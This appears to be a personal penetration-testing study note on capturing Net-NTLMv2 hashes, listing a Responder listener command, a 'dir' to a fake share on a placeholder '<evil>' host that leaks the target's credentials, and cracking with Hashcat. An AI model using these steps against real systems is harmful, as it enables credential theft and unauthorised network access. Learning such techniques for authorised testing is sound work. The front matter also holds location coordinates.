---
title: Capturing the Hash
updated: 2025-05-17 10:51:26Z
created: 2025-04-29 04:19:32Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Net-NTLMv2
Used for Authenticating Windows Clients over a network
1. Start **responder** on kali to setup SMB listening
`responder -I <interface>`
2. From target machine, access a fake share
eg `dir \\<evil>\blah`
3. Check **responder** for captured Hash
4. Save hash to **file.hash** and crack with Hashcat (see 06 - CRACKING | Hashcat)